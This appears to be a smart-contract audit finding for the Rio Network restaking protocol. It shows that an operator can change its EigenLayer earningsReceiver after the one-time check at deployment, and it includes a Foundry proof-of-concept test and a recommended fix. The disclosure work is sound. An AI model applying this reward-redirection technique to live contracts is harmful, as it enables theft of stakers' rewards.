Straight Neon Blackbird

medium

# An operator can change the earningsReceiver after deploying an OperatorDelegator and steal the rewards

## Summary

It checks the EigenLayer configuration of the operator only when deploying OperatorDelegator, but it can be changed by operator later. In particular, if the `earningsReceiver` setting is changed, the operator can steal the rewards.

## Vulnerability Detail

When deploying OperatorDelegator, it checks whether the value set by the operator on the EigenLayer is correct. It verifies if the `earningsReceiver`, `delegationApprover`, `stakerOptOutWindowBlocks` configuration values are correct. In particular, `earningsReceiver` should be set to RewardDistributor contract so that rewards are distributed through the Rio system.

```solidity
function initialize(address token_, address operator) external initializer {
    __RioLRTCore_init_noVerify(token_);

    if (msg.sender != address(operatorRegistry())) revert ONLY_OPERATOR_REGISTRY();

@>  IDelegationManager.OperatorDetails memory operatorDetails = delegationManager.operatorDetails(operator);
@>  if (operatorDetails.earningsReceiver != address(rewardDistributor())) revert INVALID_EARNINGS_RECEIVER();
@>  if (operatorDetails.delegationApprover != address(0)) revert INVALID_DELEGATION_APPROVER();
@>  if (operatorDetails.stakerOptOutWindowBlocks < operatorRegistry().minStakerOptOutBlocks()) {
        revert INVALID_STAKER_OPT_OUT_BLOCKS();
    }

    delegationManager.delegateTo(
        operator,
        ISignatureUtils.SignatureWithExpiry(new bytes(0), 0),
        bytes32(0)
    );

    // Deploy an EigenPod and set the withdrawal credentials to its address.
    address eigenPodAddress = eigenPodManager.createPod();

    eigenPod = IEigenPod(eigenPodAddress);
    withdrawalCredentials = _computeWithdrawalCredentials(eigenPodAddress);
}
```

This setting is only checked at deployment and is not checked afterwards. Therefore, after deploying OperatorDelegator, if the operator changes the settings by making a contract call to EigenLayer, they can steal the rewards.

This is PoC. Add it to the RioLRTOperatorRegistry.t.sol file and run it.

```solidity
function test_PoCChangeEigenLayerConfig() public {
    uint40 validatorCap = 100;
    address operator = address(1);

    vm.prank(operator);
    delegationManager.registerAsOperator(
        IDelegationManager.OperatorDetails({
            earningsReceiver: address(reETH.rewardDistributor),
            delegationApprover: address(0),
            stakerOptOutWindowBlocks: 0
        }),
        metadataURI
    );

    (uint8 operatorId, address delegator) = reETH.operatorRegistry.addOperator(
        IRioLRTOperatorRegistry.OperatorConfig({
            operator: operator,
            initialManager: address(this),
            initialEarningsReceiver: address(this),
            initialMetadataURI: metadataURI,
            strategyShareCaps: defaultStrategyShareCaps,
            validatorCap: validatorCap
        })
    );
    assertEq(operatorId, 1);
    assertNotEq(delegator, address(0));

    IRioLRTOperatorRegistry.OperatorPublicDetails memory operatorDetails =
        reETH.operatorRegistry.getOperatorDetails(operatorId);

    assertEq(operatorDetails.active, true);
    assertEq(operatorDetails.delegator, delegator);
    assertEq(operatorDetails.manager, address(this));
    assertEq(operatorDetails.pendingManager, address(0));
    assertEq(operatorDetails.earningsReceiver, address(this));
    assertEq(operatorDetails.validatorDetails.cap, validatorCap);

    assertEq(reETH.operatorRegistry.operatorCount(), 1);
    assertEq(reETH.operatorRegistry.activeOperatorCount(), 1);

    assertEq(delegationManager.earningsReceiver(operator), address(this));

    // change setting
    vm.prank(operator);
    delegationManager.modifyOperatorDetails(IDelegationManager.OperatorDetails({
        earningsReceiver: operator, // change earning receiver
        delegationApprover: address(0),
        stakerOptOutWindowBlocks: 0
    }));

    assertEq(delegationManager.earningsReceiver(operator), operator); // earningsReceiver changed
}
```

## Impact

If the operator changes the earningsReceiver settings, they can steal the rewards.

## Code Snippet

[https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/4f01e065c1ed346875cf5b05d2b43e0bcdb4c849/rio-sherlock-audit/contracts/restaking/RioLRTOperatorDelegator.sol#L81-L83](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/4f01e065c1ed346875cf5b05d2b43e0bcdb4c849/rio-sherlock-audit/contracts/restaking/RioLRTOperatorDelegator.sol#L81-L83)

## Tool used

Manual Review

## Recommendation

Penalize operators for changing settings.